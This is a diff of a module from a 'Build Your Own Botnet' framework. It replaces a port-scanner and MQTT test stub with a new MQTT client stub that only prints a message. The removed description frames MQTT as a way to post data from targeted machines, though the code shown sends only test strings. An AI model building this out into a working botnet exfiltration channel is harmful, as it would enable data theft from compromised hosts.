@@ -1,43 +1,39 @@
-    #!/usr/bin/python
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Port Scanner (Build Your Own Botnet)'
-
-# standard libarary
-import os
+'MQTT client (Build Your Own Botnet)'
+# standard library
 import sys
+import time
 import json
-# import Queue
-import socket
+import threading
+
+# packages
 import paho.mqtt.client as mqtt
 import paho.mqtt.publish as publish
-
-if sys.version_info[0] > 2:
-    from urllib.request import urlopen
-else:
-    from urllib import urlopen
-import subprocess
 
 # utilities
 import util
 
 # globals
-packages = []
+packages = ['paho-mqtt']
 platforms = ['win32','linux2','darwin']
 results = {}
-threads = {}
-targets = []
-ports = json.loads(urlopen('https://pastebin.com/raw/WxK7eUSd').read())
-# tasks = Queue.Queue()
-usage = 'mqtt [host]:[port]'
-desciription = """
-Post Data from targeted machine via MQTT broker, rather than HTTP Request
+usage = 'mqtt <host>:<port>:<topic>'
+description = """
+Post data from client to MQTT broker.
 """
 
+# main
+def _run():
+    print("I'm running inside the mqtt module!!!!")
 
 
-def run(host='test.mosquitto.org'):
-    broker_address="localhost"
-    client = mqtt.Client("P1") #create new client instance
-    client.connect(broker_address)
-    client.publish("pat/testTopic", "This is a test")
-    publish.single("pat/testTopic", "This is another single test", hostname="localhost")
+def run():
+    """
+    Run the MQTT Module
+
+    """
+    t = threading.Thread(target=_run, name=time.time())
+    t.setDaemon(True)
+    t.run()
+    return t
